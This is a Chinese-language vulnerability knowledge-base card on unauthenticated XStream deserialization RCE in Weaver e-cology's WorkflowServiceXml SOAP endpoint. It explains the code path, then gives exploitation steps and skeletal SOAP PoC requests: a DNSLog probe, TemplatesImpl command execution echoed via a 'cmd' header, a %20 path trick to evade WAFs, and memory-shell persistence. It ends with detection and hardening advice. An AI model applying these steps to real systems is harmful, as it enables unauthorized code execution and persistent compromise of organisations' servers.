---
id: web-java-deserialization-xstream-weaver-workflowservicexml-unauth-rce
title: 泛微 e-cology /services/WorkflowServiceXml 未授权 XStream 反序列化：doCreateWorkflowRequest 的 SOAP string 经 XmlUtil.xmlToObject→XStream.fromXML（xstream-1.3）执行任意代码
type: scenario
domain: web
path: web/java/deserialization/xstream
technique: weaver-workflowservicexml-xfire-xstream-unauth-deserialization
tags:
- java
- weaver
- ecology
- oa
- xfire
- soap
- xstream
- deserialization
- templatesimpl
- rce
- unauthenticated
cve: []
severity: critical
confidence: high
status: verified
affected_versions: 泛微 e-cology 9.0（原文环境；内置 xstream-1.3）
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V566
  verified_at: '2026-11-12T09:18:44+08:00'
  notes: '已对照原文 24 张图核对：图07 DNSLog 记录 uo711j.dnslog.cn（URLDNS 探测），图08 POST /services%20/WorkflowServiceXml 带 cmd: whoami 返回 500 且响应体为 nt authority\system（Server: Resin/4.0.58），图09-14 web.xml XFire /services/* 映射、XFireServletController.doService/invoke、WorkflowServiceImplXml.doCreateWorkflowRequest→XmlUtil.xmlToObject→XStream.fromXML、alias 仅 WorkflowRequestInfo 且 new XStream() 无白名单、xstream-1.3。卡片 URL、SOAP 结构、HTML 实体编码说明与原文一致。affected_versions 原文标题/环境标注 9.0 与 xstream-1.3。dedup top 为泛微 mToken 登录绕过、工单 SQL 注入、XFire 白名单反射调用卡，入口部分重叠但 sink 不同，非同链；dup-scan 无涉及 pair。未验证点：卡片 PoC 为原文超长 XStream XML/字节码的结构化摘录（卡片已说明），未复现。'
url: /docs/web/java/deserialization/xstream/web-java-deserialization-xstream-weaver-workflowservicexml-unauth-rce/
draft: false
kb_aliases:
- 泛微 XStream 反序列化
- WorkflowServiceXml
- /services%20/WorkflowServiceXml
- doCreateWorkflowRequest
- 泛微 OA 未授权反序列化
- XFire XStream RCE
---

## 一句话结论

泛微 e-cology 的 XFire 终点 `/services/WorkflowServiceXml` 无需登录即可调用；`doCreateWorkflowRequest` 把 SOAP Body 里的 `<web:string>` 参数交给 `WorkflowServiceImplXml`，其中 `XmlUtil.xmlToObject` 最终执行 `XStream.fromXML()`（原文环境 xstream-1.3，无类型白名单），攻击者提交 HTML 编码的 XStream XML 即可反序列化 `TemplatesImpl` 等链执行任意命令，并用自定义 translet 从 `ServletInvocation` 取 request/response 回显。

## 原理

- **入口暴露**：`WEB-INF/web.xml` 把 `org.codehaus.xfire.transport.http.XFireConfigurableServlet` 映射到 `/services/*`；XFire servlet 的 `doGet/doPost` 都调用 `XFireServletController.doService`，按 URL 中的服务名取出 `WorkflowServiceXml` 后进入 `invoke`。
- **SOAP 参数直达业务方法**：`invoke` 在 contentType 非 `multipart/related` 时用 `XMLStreamReader` 读取请求体，构造 `InMessage` 并交给 XFire 通道；SOAP Body 元素名匹配到 `WorkflowServiceImplXml#doCreateWorkflowRequest(String, int)` 后，第一个 `<web:string>` 文本（即攻击者可控的 XML 字符串）作为 `var1` 传入。
- **可控字符串进入 XStream**：`doCreateWorkflowRequest` 调用 `this.xmlUtil1.xmlToObject(var1)`；`XmlUtil.xmlToObject(String)` 内部是 `xs.fromXML(var1)`，`XmlUtil` 初始化时 `new XStream()` 仅注册 `weaver.workflow.webservices.WorkflowRequestInfo` 别名，没有类型白名单/黑名单。XStream 1.3 默认可按 XML 中的类名实例化任意类型，`fromXML` 过程会触发 `TemplatesImpl` 的 `newTransformer()`/`getOutputProperties()` 链，加载攻击者提供的字节码并执行。
- **为什么危害是命令执行**：反序列化链使用 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`（文章中的 `TestObj1 extends AbstractTranslet`），`_bytecodes` 为恶意 translet；其在静态初始化块中通过 `com.caucho.server.dispatch.ServletInvocation.getContextRequest()` 拿到当前请求，读取 `cmd` 请求头执行命令并把结果写回响应，从而在反序列化请求内直接回显。
- **探测方式**：先用 URLDNS 链（`java.util.HashMap` + `java.net.URL`）让目标解析 DNSLog 域名，确认目标确实执行了 XML 反序列化，再换命令执行链。
- **路径编码**：原文漏洞 URL 写作 `/services%20/WorkflowServiceXml`，在 `/services` 后插入 `%20`（空格）编码；服务端解码/规范化后仍路由到 XFire Servlet，同时可绕过按路径前缀匹配的过滤器/WAF。

## 触发条件

- 目标为泛微 e-cology（原文 9.0 环境），`web.xml` 中 XFireConfigurableServlet 映射 `/services/*`，且 `WorkflowServiceXml` 服务已注册（默认 `META-INF/xfire/services.xml`）。
- `/services/WorkflowServiceXml`（或 `/services%20/WorkflowServiceXml`）未授权可达，认证 Filter/WAF 未拦截 SOAP 请求。
- classpath 存在存在漏洞的 XStream（原文 `xstream-1.3.jar`），未配置类型白名单。
- 目标 JDK 允许 `TemplatesImpl` 定义字节码（原文环境可执行；高版本 JDK 可能需调整链）。

## 利用步骤

1. 探测服务：请求 `/services/WorkflowServiceXml` 或 `/services%20/WorkflowServiceXml`，观察是否返回 SOAP Fault/HTTP 500 而非 404，确认 XFire 终点存在。
2. DNSLog 验证：构造 `doCreateWorkflowRequest` 的 SOAP 请求，`<web:string>` 内放 HTML 编码的 URLDNS XStream XML，提交后查看 DNSLog 是否收到目标解析记录。
3. 命令执行：把 XStream XML 换成 `TemplatesImpl` + 自定义 `AbstractTranslet`（静态块取 `ServletInvocation.getContextRequest()`，读 `cmd` 头执行命令并 `getWriter()` 回显），HTML 编码后放入 `<web:string>`；请求头加 `cmd: whoami`。
4. 读取响应：命令输出直接写回 SOAP 响应（原文返回 500 但响应体包含 `nt authority\system`）。
5. 后续：结合 Resin 回显/内存马卡，投递 Filter 内存马或 JSP 以稳定驻留。

## PoC

URLDNS 探测（`<web:string>` 内为 HTML 编码后的 XStream XML，示意）：

```http
POST /services%20/WorkflowServiceXml HTTP/1.1
Host: target:8080
SOAPAction: ""
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
  <soapenv:Header/>
  <soapenv:Body>
    <web:doCreateWorkflowRequest>
      <web:string>&lt;map&gt;...&lt;entry&gt;&lt;url&gt;http://dnslog.example/&lt;/url&gt;&lt;string&gt;http://dnslog.example/&lt;/string&gt;&lt;/entry&gt;...&lt;/map&gt;</web:string>
      <web:string>2</web:string>
    </web:doCreateWorkflowRequest>
  </soapenv:Body>
</soapenv:Envelope>
```

说明：原文的完整 XStream XML 与 TemplatesImpl 字节码较长，此处只保留结构；`<web:string>` 内部必须做 HTML 实体编码（`<`→`&lt;` 等），否则会破坏外层 SOAP XML 解析。

```http
POST /services%20/WorkflowServiceXml HTTP/1.1
Host: target:8080
cmd: whoami
SOAPAction: ""
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope ...>
  <soapenv:Body>
    <web:doCreateWorkflowRequest>
      <web:string>&lt;java.util.PriorityQueue...TemplatesImpl...&gt;...</web:string>
      <web:string>2</web:string>
    </web:doCreateWorkflowRequest>
  </soapenv:Body>
</soapenv:Envelope>
```

返回 500 且响应体出现命令结果即成功（原文回显 `nt authority\system`）。原文未标注具体 CVE；DNSLog 与命令执行均有截图实测。

## 变体与关联

- URLDNS 探测链：`java.util.HashMap`/`java.net.URL`，仅触发 DNS 解析，适合无回显环境。
- 命令执行链：原文称 payload 由 cb/cc 链构造，最终使用 `TemplatesImpl`（translet 静态块）加载；也兼容 `CommonsBeanutils`/`CommonsCollections` 的 TemplatesImpl 变体（取决于 classpath）。
- 回显：translet 内使用 `ServletInvocation.getContextRequest()` + `_response` 的 Resin 回显路径，见同文章的 Resin 回显卡；Windows 用 `cmd /c`，Linux 用 `sh -c`。
- 同一 XFire `/services/*` 入口还存在未授权方法调用类问题（见 XFire 白名单卡）；本卡是不同的 XStream sink。
- 路径绕过：`/services%20/WorkflowServiceXml` 的编码空格形式是原文实测入口，可绕过按 `/services/` 前缀的判断。

## 检测与防御

- 升级泛微 e-cology 修复版本；升级 XStream 并配置类型白名单（`allowTypes`/`denyTypes`），禁止 `TemplatesImpl` 等危险类型。
- 为 `/services/*` 增加认证与授权，关闭不需要的 XFire 服务；对 URL 中的 `%20` 等编码做规范化后再匹配。
- WAF 针对 `doCreateWorkflowRequest`、`<web:string>` 内嵌 XML、`TemplatesImpl`/`FromXML`/`processBuilder` 等关键字检测；限制 SOAP Body 大小。
- 日志排查：POST `/services/WorkflowServiceXml`（含 `%20` 变体）的 500 响应、请求头 `cmd`、DNS 外连；部署 RASP 监控 `XStream.fromXML` 与 `TemplatesImpl.newTransformer` 调用。
